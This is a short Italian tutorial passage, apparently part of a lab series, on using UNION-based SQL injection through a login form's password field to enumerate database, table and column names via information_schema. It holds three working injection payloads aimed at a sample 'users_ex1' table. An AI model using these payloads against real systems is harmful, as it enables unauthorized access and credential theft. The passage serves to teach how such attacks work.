# Recuperiamo informazioni sulle tabelle e colonne del database

Nel primo esempio abbiamo visto come forzare l'accesso al sito web con un attacco di SQL injection. Ma affinchè possa funzionare, bisogna avere una certa conoscenza su come sono fatte le tabelle e sui loro nomi.

In questo esempio proveremo ad estrarre queste informazioni:

```
' UNION SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1,1; -- x
```

```
' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'my_db' LIMIT 0,1; -- x
```

```
' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'my_db' AND TABLE_NAME = 'users_ex1' LIMIT 3,1; -- x
```

Utilizzando questi tre frammenti di query all'interno del campo password, riusciamo con molta pazienza a recuperare tutte le informazioni che caratterizzano il nostro form di login:
1. Nome del database
2. Nome della tabella che contiene le credenziali
3. Nome della colonna che contiene la password (o gli altri campi della tabella)
